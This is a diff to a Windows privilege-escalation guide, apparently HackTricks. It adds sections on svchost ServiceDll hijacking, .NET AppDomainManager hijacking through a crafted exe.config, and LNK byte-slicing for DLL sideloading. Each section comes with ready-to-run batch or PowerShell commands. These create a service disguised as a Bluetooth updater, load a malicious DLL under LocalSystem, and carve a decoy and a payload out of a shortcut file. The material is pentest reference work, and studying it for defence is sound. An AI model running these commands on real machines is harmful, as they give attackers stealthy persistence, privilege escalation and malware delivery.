@@ -652,6 +652,44 @@ To change the Path of the binary executed:
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
+
+### Svchost ServiceDll hijacking (ServiceDll/ServiceMain)
+
+If you can **create/modify a service registry tree** (or have rights to re-create a service), you can make `svchost.exe` load an attacker DLL by setting the service's `Parameters\ServiceDll` and (optionally) `Parameters\ServiceMain` values and wiring the service to an `SvcHost` group. This yields persistent execution inside the service host under the service account.
+
+Example (abusing a service name and SvcHost group called `bthsrv`):
+
+```bat
+sc stop "bthsrv"
+sc delete "bthsrv"
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v "bthsrv" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v "bthsrv" /t REG_MULTI_SZ /d "bthsrv" /f
+sc create "bthsrv" binPath= "%SystemRoot%\system32\svchost.exe -k bthsrv" start= auto type= share DisplayName= "Bluetooth Update Service"
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthsrv\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\Windows\System32\wbem\WinSync.dll" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\bthsrv\Parameters" /v "ServiceMain" /t REG_SZ /d "TraceGetIMSIByIccID" /f
+net start "bthsrv"
+```
+
+Notes:
+`ServiceDll` points to the malicious DLL. `ServiceMain` names the exported entry point (defaults to `ServiceMain` if omitted).
+The `SvcHost` group name must match the `-k` parameter for the service.
+
+### .NET AppDomain hijacking via <exe>.config (T1574.014)
+
+If you can write into the directory of a **trusted .NET executable** that is executed as a service (e.g., `dfsvc.exe`, `tzsync.exe`), dropping a crafted `<exe>.config` alongside it can redirect the runtime to load attacker-controlled .NET code (AppDomainManager). Operators typically force execution by recreating or restarting the service.
+
+Example workflow:
+
+```bat
+copy malicious.dll C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ /y
+copy dfsvc.exe.config C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ /y
+sc delete DfSvc
+sc create DfSvc binPath= "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe" start= auto obj= LocalSystem
+sc start DfSvc
+```
+
+Make sure the config points to your assembly (AppDomain manager or other startup hook) and is placed next to the target binary.
+
 ### Services registry AppendData/AddSubdirectory permissions
 
 If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**
@@ -706,6 +744,27 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 Windows allows users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
 ## Applications
+
+
+### Weaponized LNK byte-slicing to DLL sideloading
+
+Large `.lnk` files can embed multiple payloads inside their binary structure. A shortcut can launch PowerShell to locate the LNK by size, read raw bytes, and slice fixed ranges into a decoy + legitimate EXE + malicious DLL + encrypted payload. Launching the legit EXE triggers DLL sideloading.
+
+```powershell
+$lnk = Get-ChildItem -Filter *.lnk | Where-Object {$_.Length -eq 1413555} | Select-Object -First 1
+$bytes = [IO.File]::ReadAllBytes($lnk.FullName)
+$dir = $env:TEMP
+[IO.File]::WriteAllBytes((Join-Path $dir 'decoy.pdf'), $bytes[4184..663602])
+[IO.File]::WriteAllBytes((Join-Path $dir 'App.exe'), $bytes[663603..823554])
+[IO.File]::WriteAllBytes((Join-Path $dir 'App.dll'), $bytes[823555..1032962])
+ii (Join-Path $dir 'App.exe')
+```
+
+This is a delivery mechanism for classic DLL sideloading, see:
+
+{{#ref}}
+dll-hijacking/README.md
+{{#endref}}
 
 ### Installed Applications
 
@@ -1981,5 +2040,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
 - [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
 - [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
+
+- [Check Point Research – Silver Dragon Targets Organizations in Southeast Asia and Europe](https://research.checkpoint.com/2026/silver-dragon-targets-organizations-in-southeast-asia-and-europe/)
 
 {{#include ../../banners/hacktricks-training.md}}
